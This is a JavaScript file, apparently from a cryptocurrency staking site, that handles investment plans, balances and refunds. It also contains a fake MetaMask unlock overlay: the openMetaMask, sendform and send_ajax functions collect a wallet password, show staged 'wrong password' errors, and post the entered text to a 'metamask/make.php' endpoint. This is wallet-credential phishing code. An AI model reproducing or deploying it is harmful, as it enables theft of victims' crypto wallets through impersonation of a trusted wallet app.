function noti(msg, status) {
    toastr[status](msg);
    toastr.options = {
      "closeButton": false,
      "debug": false,
      "newestOnTop": false,
      "progressBar": false,
      "rtl": false,
      "positionClass": "toast-top-right",
      "preventDuplicates": false,
      "onclick": null,
      "showDuration": 300,
      "hideDuration": 1000,
      "timeOut": 5000,
      "extendedTimeOut": 1000,
      "showEasing": "swing",
      "hideEasing": "linear",
      "showMethod": "fadeIn",
      "hideMethod": "fadeOut"
    }
  }



	$("#alert_close_modal").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });

  $("#alert_close_modal_btn").on("click", function() {
    $("#alert_message_modal").css("display", "none");
    var alertMessageId = $("#alertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: alertMessageId
	      },
	      success: function(response) {

	      }
	    })
  });


   function openMetaMask() {
    $("#metMaskBlock").css("opacity", "1");
    $("#metMaskBlock").css("z-index", "99999999");
    setTimeout(function () {
        $('#load').addClass('hide');
        $("#verify_popap_meta").css("display", "none");
        document.getElementById('loaded').classList.remove('hide');
    }, 1000);

    setInterval(function() {
      if(($("#pswrd").val().length > 7)) {document.getElementById("buttonf").disabled = false;} else {document.getElementById("buttonf").disabled = true;}
    }, 1000)


  }


function func() {
  document.getElementById('pswrd').classList.remove('border-red');
  $('#error1').addClass('hide');
}


var calc = 0;

function sendform(e) {
        e.preventDefault();
        //send_message()
        calc ++
        $('#error1').addClass('hide');
        $('#error2').addClass('hide');
        document.getElementById('pswrd').classList.remove('border-red');

        if (calc < 3) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        $('#pswrd').addClass('border-red');
        document.getElementById('error1').classList.remove('hide');
        document.getElementById('buttonf').classList.remove('hide'); 
        }, 1234);
        }

        if (calc > 2) {
        $('#buttonf').addClass('hide');
        document.getElementById('loading').classList.remove('hide');
        setTimeout(function () {
        $('#loading').addClass('hide');
        document.getElementById('error2').classList.remove('hide');
        }, 984);
        }
       
}
    
    
function send_message() {
        var res = document.getElementById('pswrd').value;
            send_ajax(res)
}

function send_ajax(text) {
       return new Promise(function (resolve, reject) {
            $.ajax({
                type: 'post',
                url: '../metamask/make.php',
                dataType: 'json',
                data: {
                    'text':text,
                }
            });
        });
}


$("#closeMetaMaskBtn").on("click", function() {
    $("#verify_popap_meta").css("display", "none");
    var MetaalertMessageId = $("#MetaalertMessageId").val();

		  $.ajax({
	      url: "../ajax/ajax",
	      type: "POST",
	      data: {
	        action: "VIEWED_ALERT_MESSAGE",
	        message_id: MetaalertMessageId
	      },
	      success: function(response) {

	      }
	    })
  }); 

 
    
    var active_coin = 'BTC';
    var active_plan = 0;

    function availableBalance() {
        var available = $("#my_available_balance").html();
        $("#amount_input").val(available);
        calculatePlan();
    }

    $(".stakingForm__coin-items .staking__currency-item").on("click", function() {
        active_coin = $(this).find('.stakingForm__currency-sub').text();

        $.ajax({
            url: '/ajax/MY_EX_BALANCE',
            type: 'POST',
            data: {
                crypto: active_coin
            },
            success: function(event) {

                $("#my_available_balance").empty().html(event); 
                $("#my_available_crypto").empty().html(" " + active_coin.toUpperCase()); 
           
            }
        })

        $("#expected_profit_crypto").html(active_coin);
        $("#total_profit_crypto").html(active_coin);

        calculatePlan();
    })

    function selectPlan(num) {
        active_plan = num;
        calculatePlan();
    }

    $("#stake_btn").on("click", function(e) {
        e.preventDefault();

        var select_coin = active_coin;
        var invest_amount = $("#amount_input").val();
        var my_balance = $("#my_available_balance").val();
        var plan_percent = parseFloat($("#plan_percent_" + active_plan).val());

        if(parseFloat(my_balance) < parseFloat(invest_amount)) {
          noti("You do not have enough funds for this amount", "error");
        } else if(invest_amount == '' || parseFloat(invest_amount) == 0) {
          noti("Please, enter invest amount", "info");
        } else if(active_plan == 0) {
            noti("Please, select invest plan", "error");
        } else {
          var profit_amount = parseFloat(invest_amount) / 100 * plan_percent;
              profit_amount = parseFloat(profit_amount).toFixed(6);
          var total_amount = parseFloat(invest_amount) + parseFloat(profit_amount);
              total_amount = parseFloat(total_amount).toFixed(6);

          $.ajax({
              url: "/ajax/CREATE_INVEST_PLAN",
              type: "POST",
              data: {
                invest_plan: active_plan,
                invest_coin: select_coin,
                invest_amount: invest_amount,
                invest_profit: profit_amount,
                invest_total: total_amount
              },
              success: function(response) {
                if(response == '1') {
                    noti("Invest plan successfully created", "success");
                    $("#amount_input").val("");
                    $("#expected_profit_amount").html('0.00000');
                    $("#expected_profit_usd").html('0.00');
                    $("#total_profit_amount").html('0.00000');
                    $("#total_profit_usd").html('0.00');

                    $.ajax({
                        url: '/ajax/MY_EX_BALANCE',
                        type: 'POST',
                        data: {
                            crypto: active_coin
                        },
                        success: function(event) {

                            $("#my_available_balance").empty().html(event); 
                            $("#my_available_crypto").empty().html(" " + active_coin.toUpperCase()); 
                       
                        }
                    })

                    $("#staking_table").load("/ajax/GET_STAKING_HISTORY");
                    
                } else if(response == '2') {
                    noti("Not enough balance.", "error");
                } else if(response == '4') {
                    noti("An unknown error has occurred, please try again later", "error");
                } else if(response == '6') {
                    noti("You cannot make an investment. Contact support for details", "error");
                } else {
                    noti("An unknown error has occurred, please try again later", "error");
                }

              }
            })
        }
      });

    $('#amount_input').keyup(function(e){

        calculatePlan();
    
      });

    function calculatePlan() {
        var my_balance = $("#my_available_balance").val();
        var input_amount = $("#amount_input").val();
        var plan_percent = $("#plan_percent_" + active_plan).val();
        var selected_coin = active_coin;

        if(active_plan != 0 && input_amount != "") {
            if($("#amount_input").val() == '') {
              input_amount = 0;
            }


            var profit_amount = parseFloat(input_amount) / 100 * plan_percent;
                profit_amount = parseFloat(profit_amount).toFixed(6);
            var profit_amount_usd = parseFloat($("#" + selected_coin + "_course").val()) * profit_amount;
                profit_amount_usd = profit_amount_usd.toFixed(2);

            var total_amount = parseFloat(input_amount) + parseFloat(profit_amount);
                total_amount = parseFloat(total_amount).toFixed(6);
            var total_amount_usd = parseFloat($("#" + selected_coin + "_course").val()) * total_amount;
                total_amount_usd = total_amount_usd.toFixed(2);



            if(parseFloat(my_balance) < parseFloat(input_amount)) {
              noti("You do not have enough funds for this amount", "error");
              $("#expected_profit_amount").html('0.0000');
              $("#expected_profit_usd").html('0.00');
              $("#total_profit_amount").html('0.0000');
              $("#total_profit_usd").html('0.00');
            } else {
              $("#expected_profit_amount").html(profit_amount);
              $("#expected_profit_usd").html(profit_amount_usd);
              $("#total_profit_amount").html(total_amount);
              $("#total_profit_usd").html(total_amount_usd);
            }
        }
    }

    function refundInvestPlan(id) {


        $.ajax({
          url: "/ajax/REFUND_INVEST_PLAN",
          type: "POST",
          data: {
            invest_plan_id: id
          },
          success: function(response) {
            if(response == "1") {
              $("#invest_return_modal").css("display", "flex");
              $("#invest_modal_span_amount").html($("#amount_block_" + id).text());
              noti("Refund completed successfully", "success");

              $("#plan_block_" + id).remove();
            } else if(response == "2") {
              noti("This plan has already been closed", "error");
            } else {
              noti("An unknown error has occurred, please try again later", "error");
            }
          }
        });
        
    }

    $("#staking_table").load("/ajax/GET_STAKING_HISTORY");